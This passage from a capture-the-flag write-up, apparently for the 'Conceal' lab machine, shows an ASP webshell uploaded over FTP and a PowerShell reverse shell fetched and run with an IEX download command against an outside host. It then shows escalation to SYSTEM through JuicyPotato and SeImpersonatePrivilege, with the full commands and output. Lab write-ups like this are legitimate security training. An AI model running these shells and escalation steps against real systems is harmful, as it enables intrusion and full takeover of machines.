This error tells us the server isn't configure to use .aspx files, but .asp files are still uploaded we success, for example:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $echo "This is a .asp test" > file.asp
```

![img](/images/writeup-conceal/4.png)

So we can look for .asp webshells and upload one to grant ourselves RCE on the box.

---

## Exploitation: ASP shell upload and execution

My first attempt is usually Meterpreter shells but with recent Windows versions they are always blocked by Defender and thus do not work unless obfuscation is done, either that or the payload is launched in other ways so that the plain payload isn't dropped as-is on the disk. This is one of those cases as Defender will flag the payload as dangerous and will not let us load it or even download it back from FTP:

```aaa
ftp> put msfconceal.asp
local: msfconceal.asp remote: msfconceal.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
38175 bytes sent in 0.06 secs (650.5815 kB/s)
ftp> get msfconceal.asp
local: msfconceal.asp remote: msfconceal.asp
200 PORT command successful.
550 Operation did not complete successfully because the file contains a virus or potentially unwanted software.
ftp>
```

So instead I did a quick Google search for .asp shells and I run into this very rich [GitHub repository](https://github.com/tennc/webshell/blob/master) which has several of them. Most of these are likely to work so I went for a random one called simply webshell.asp and uploaded it, it's a very basic cmd shell that autoatically gives us our username (which is the same we saw from the SNMP data):

![img](/images/writeup-conceal/5.png)

The downside of using this shell or any other we can upload from FTP is that the /upload/ folder is reset every few minutes, purging all the files inside it. So because this shell isn't too reliable as we would need to reupload it every time we can spawn a reverse shell by launching one of NIshang's:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $locate nishang | grep Tcp
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
┌─[baud@parrot]─[~/conceal]
└──╼ $cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 conceal.ps1
```

I chose to use the complete shell instead of the oneliner in reverse mode, just add this line at the end of the script to make it that the shell is spawned as soon as the script is executed:

```aaa
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 9999
```

Start an HTTP server locally in the script's folder and a listener and run this command from the webshell:

```aaa
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37:9090/conceal.ps1')
```

And the shell arrives in just a couple seconds:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.116] 49674
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\SysWOW64\inetsrv>whoami
conceal\destitute
```

Running *whoami /all* to list our privileges reveals something very interesting, we have SeImpersonatePrivilege enabled so we can escalate privileges to SYSTEM using RottenPotato/RottenPotatoNG/JuicyPotato:

```aaa
PS C:\users> whoami /all

USER INFORMATION
----------------

User Name         SID                                          
================= =============================================
conceal\destitute S-1-5-21-4220874023-1166253506-927404976-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                                                              Attributes                                        
==================================== ================ ================================================================================================ ==================================================
Everyone                             Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\DefaultAppPool           Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                                                      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-32-4028125388-2803578072-1053907958-341417128-2434011155-477421480-740873757-3973419746    Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-32-2745667521-2937320506-1424439867-4164262144-2333007343-2599685697-2993844191-2003921822 Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-32-1034403361-4122601751-838272506-684212390-1217345422-475792769-1698384238-1075311541    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                                                       


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

PS C:\users> whoami : ERROR: Unable to get user claims information.
At line:1 char:1
+ whoami /all
+ ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (ERROR: Unable t...ms information.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

---

## Privilege escalation: exploiting SeImpersonatePrivilege with JuicyPotato

I decided to use JuicyPotato, so after downloading the source from [GitHub](https://github.com/ohpe/juicy-potato) I compiled it with Visual Studio and dropped the binary on my Parrot box, then downloaded it on Conceal:

```aaa
PS C:\users\destitute\downloads> iwr http://10.10.14.37:9090/JuicyPotato.exe -outfile ./juicy.exe
PS C:\users\destitute\downloads> dir

    Directory: C:\users\destitute\downloads

Mode                LastWriteTime         Length Name 
----                -------------         ------ ---                                                                  
-a----       04/09/2019     17:24         335360 juicy.exe    
```

We can see the required parameters to run it just by launching the program:

```aaa
PS C:\users\destitute\downloads> ./juicy.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

-l can be a port of our choice, -t determines what CreateProcess method to use, and -p is the program to be launched with the new privileges. Everything else is optional, I'm going to use -a to pass command line arguments to the program I want to launch and -c to specify a different CLSID (Class ID) than the default one because as we can see from this quick test the default option doesn't work:

```aaa
PS C:\users\destitute\downloads> ./juicy.exe -t * -p c:\windows\system32\cmd.exe -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: 10038
```

A list of CLSID for each Windows version is available on the [JuicyPotato repo](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) so first we check what OS we are running:

```aaa
PS C:\users\destitute\downloads> systeminfo

Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00329-00000-00003-AA343
Original Install Date:     12/10/2018, 20:04:27
System Boot Time:          04/09/2019, 14:58:35
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,275 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,352 MB
Virtual Memory: In Use:    847 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::a054:9f1:c6f7:d4e3
                                 [03]: dead:beef::24cc:92e3:8b1e:bd4d
                                 [04]: dead:beef::a054:9f1:c6f7:d4e3
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

It's Windows 10 Enterprise so we choose a CLSID from the right [page](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise), one that belongs to the SYSTEM account. In my example I run the program to launch PowerShell making it donwload and execute another Nishang shell that gives me a reverse shell:

```aaa
PS C:\users\destitute\downloads> ./juicy.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37:9090/system.ps1')" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
......
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

The reverse shell is established and we are NT Authority\SYSTEM, letting us access the proof.txt in Administrator's desktop:

```aaa
┌─[baud@parrot]─[~/conceal]
└──╼ $nc -lvnp 9898
listening on [any] 9898 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.116] 49705
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
```

![img](/images/writeup-conceal/6.png)










